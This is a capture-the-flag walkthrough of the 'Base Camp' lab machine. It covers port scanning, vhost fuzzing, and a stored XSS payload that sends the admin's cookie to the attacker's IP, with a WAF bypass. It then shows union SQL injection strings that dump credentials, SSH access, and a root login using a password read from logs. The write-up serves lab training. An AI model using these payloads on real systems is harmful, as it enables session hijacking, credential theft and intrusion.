# Base Camp

## Machine Information



## Port Scan

```bash
nmap -T4 -A -p- --min-rate 1000 -oN port_scan.txt 10.10.110.174

Nmap scan report for 10.10.110.174
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 (RSA)
|   256 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f (ECDSA)
|_  256 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

<figure><img src="../../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>



### VHOST enumeration



{% code overflow="wrap" %}
```bash
ffuf -H "Host: FUZZ.k2.thm" -H "User-Agent: PENTEST" -c -w "/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil.txt" -u http://k2.thm/ -fs 13229

[..snip..]
admin       [Status: 200, Size: 967, Words: 298, Lines: 24, Duration: 45ms]
it          [Status: 200, Size: 1083, Words: 322, Lines: 25, Duration: 38ms]
ADMIN       [Status: 200, Size: 967, Words: 298, Lines: 24, Duration: 42ms]

```
{% endcode %}

Add the subdomain found admin to `/etc/hosts` file and visit the page.

```
admin.k2.thm
```

<figure><img src="../../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>



In thid Admin panel there's not anything instead in the other vhost we can Sign Up to the site.

```
it.k2.thm
```

<figure><img src="../../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

Once registered we see this.

<figure><img src="../../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>



### XSS Stored - Ticket Portal

I though that the Description field for a new ticket might be vulnerable to XSS Stored.

If we try this payload and create the ticket the portal shows a WAF filter error:

```
<script>fetch('http://10.23.52.142:80/steal?cookie=' + btoa(document.cookie));</script>
```

Analyse the WAF filter we can notice that only the word "`document.cookie`" is blocked. So we can bypassing this replace that string to this `document["cookie"]`. Then, start a listener on the 80 port and wait that a support member open the ticket.

<pre data-title="XSS Payload"><code><strong>&#x3C;script>fetch('http://10.23.52.142:80/steal?cookie=' + btoa(document["cookie"]));&#x3C;/script>
</strong></code></pre>



<figure><img src="../../../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

Decode the base64 cookie obtained:

{% code overflow="wrap" %}
```
session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aIno8w.o26Y9EEMUhFuvbH98fER3MGkmB4
```
{% endcode %}

Decode this JWT and get id the cookie owned by admin user.

```
{
  "admin_username": "james",
  "id": 1,
  "loggedin": true
}
```

Yes, he's an administrator. Now add this cookie in the Browser storage and try to access into admin panel discovered before.

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

And we are in the admin panel

<figure><img src="../../../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>



### Union SQL injection

Uploading some SQLi payload and the page got a error

<figure><img src="../../../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

Adding other columns we can solve this error, and retrive DB informations

<figure><img src="../../../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

Using these payloads retrive all DB information:

{% code overflow="wrap" %}
```bash
# DB name
1' UNION SELECT 1,2,database(); -- ' # output: ticketsite

# DB Tables
0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'ticketsite'; -- ' # output: admin_auth,auth_users,tickets

# Columns
0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'admin_auth'; -- ' # output: admin_password,admin_username,email,id

# Get data table
0' UNION SELECT 1,2,group_concat(admin_username,':',admin_password SEPARATOR '<br>') FROM admin_auth; -- '
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```
{% endcode %}

### SSH Login

Only this user can access to the server

```
james:Pwd@9tLNrC3!
```

With this credentials get access through SSH

```bash
ssh james@10.10.239.252
> Pwd@9tLNrC3!
```

Print the user flag

```bash
cat /home/james/user.txt
```

## Linux PrivEsc

### User in Adm group

Running `id` command we can see that the user is in the `adm` group, it means that can see all log in the machine.

```bash
id
uid=1002(james) gid=1002(james) groups=1002(james),4(adm)  
```

Run this grep command to search some passwords in log

```bash
grep -iR "pass" /var/log
```

In this way, we found the rose's password into a nginx log.

{% code overflow="wrap" %}
```
/var/log/nginx/access.log.1:10.0.2.51 - - [24/May/2023:22:17:17 +0000] "GET /login?username=rose&password=RdzQ7MSKt)fNaz3! HTTP/1.1" 200 1356 "http://admin.k2.thm/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
{% endcode %}

Trying to connect as Rose with this password the connection won't work. Try to use this password with root user.

```
ssh root@10.10.239.252
> RdzQ7MSKt)fNaz3!
```

and we are root. Print the root flag

```bash
cat /root/root.txt
```

### Find other passwords

With root shell we can search other information like passwords.

Access to the rose's home and check for the history files.

```bash
cat /home/rose/.bash_history

sudo suvRMkaVgdfxhW!8
sudo su
```

The password for rose is `vRMkaVgdfxhW!8`



## Bonus questions

The list of all user and password that can access to the server is:

```
james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8
```

The full name of user we can found in the `/etc/passwd` file.

```bash
cat /etc/passwd

[..snip..]
james:x:1002:1002:James Bold:/home/james:/bin/bash                                                                  
root:x:0:0:root:/root:/bin/bash
rose:x:1001:1001:Rose Bud:/home/rose:/bin/bash
```

```
James Bold, Rose Bud
```

